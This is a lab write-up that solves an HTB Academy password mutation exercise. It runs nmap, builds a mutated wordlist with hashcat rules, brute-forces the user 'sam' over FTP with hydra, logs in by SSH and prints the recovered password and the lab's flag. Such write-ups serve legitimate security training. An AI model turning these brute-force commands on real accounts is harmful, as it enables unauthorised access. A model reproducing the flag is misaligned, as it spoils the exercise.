## HTB Academy: Password Mutation Module Solution

### Task
Create a mutated wordlist using the files in the ZIP file under "Resources." Use this wordlist to brute-force the password for the user "sam." Once successful, log in via SSH and submit the flag from `flag.txt`.

### Steps:

1. **Run Nmap Scan**
   Identify open ports and services on the target machine:
   ```bash
   nmap -sV -Pn <target_ip>
   ```
   Example output:
   ```
   PORT    STATE SERVICE     VERSION
   21/tcp  open  ftp         vsftpd 3.0.3
   22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
   139/tcp open  netbios-ssn Samba smbd 4.6.2
   445/tcp open  netbios-ssn Samba smbd 4.6.2
   ```

2. **Create Password List and Custom Rule**
   Using the files provided in the "Resources" section, create the `password.list` and `custom.rule`:
   ```bash
   sudo nano password.list
   sudo nano custom.rule
   ```

3. **Generate Mutated Wordlist**
   Use Hashcat to generate a mutated wordlist:
   ```bash
   hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
   ```

4. **Filter Mutated Wordlist**
   Edit the mutated wordlist to filter passwords with a length of 11 or more characters:
   ```bash
   sed -n '/^[[:alnum:][:punct:]]\{11,\}$/p' mut_password.list
   ```

5. **Brute Force with Hydra**
   Use Hydra to find the password for the user "sam" on the FTP service:
   ```bash
   hydra -l sam -P mut_password.list ftp://<target_ip> -t 48 -v
   ```
   Example successful output:
   ```
   [21][ftp] host: 10.129.7.103   login: sam   password: B@tm@n2022!
   ```

6. **Log in via SSH**
   Connect to the target machine using the found credentials:
   ```bash
   ssh sam@<target_ip>
   password: B@tm@n2022!
   ```

7. **Find and Retrieve the Flag**
   Search for the flag file and read its contents:
   ```bash
   find / -name "flag.txt" 2>/dev/null
   ```
   Example:
   ```bash
   /home/sam/smb/flag.txt
   cat /home/sam/smb/flag.txt
   ```
   The flag is:
   ```
   HTB{P455_Mu7ations}
   ```

### Conclusion
This task demonstrated how to use password mutation rules to generate a custom wordlist and perform a brute-force attack to retrieve the flag. 
## Happy Hacking!



